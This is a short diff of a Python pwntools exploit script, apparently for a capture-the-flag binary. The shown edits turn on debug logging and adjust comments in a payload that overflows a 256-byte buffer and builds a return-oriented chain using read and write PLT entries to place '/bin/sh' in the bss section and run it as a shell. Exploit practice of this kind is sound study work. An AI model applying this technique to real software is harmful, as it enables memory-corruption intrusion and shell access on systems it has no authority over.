@@ -6,7 +6,7 @@ print("--pwned by pwnWiz--")
 print("-------------------")
 print("\n")
 
-#context.log_level="debug"
+context.log_level="debug"
 
 #plt_read = 0x400630
 #plt_write = 0x400600
@@ -29,7 +29,7 @@ r.recv(1024)
 payload="A"*256
 payload+="B"*8
 
-#write /bin/sh\00 to bss_addr(0x602070)
+#write /bin/sh; to bss_addr(0x602070)
 payload+=p64(pppr)
 payload+=p64(0)
 payload+=p64(bss_addr)
@@ -51,7 +51,7 @@ payload+=p64(0x8)
 payload+=p64(plt_read)
 
 #use plt_write as system()
-payload+=p64(0x400775)
+payload+=p64(0x400775) #pr
 payload+=p64(bss_addr)
 payload+=p64(plt_write)
 payload+="AAAAAAAA"
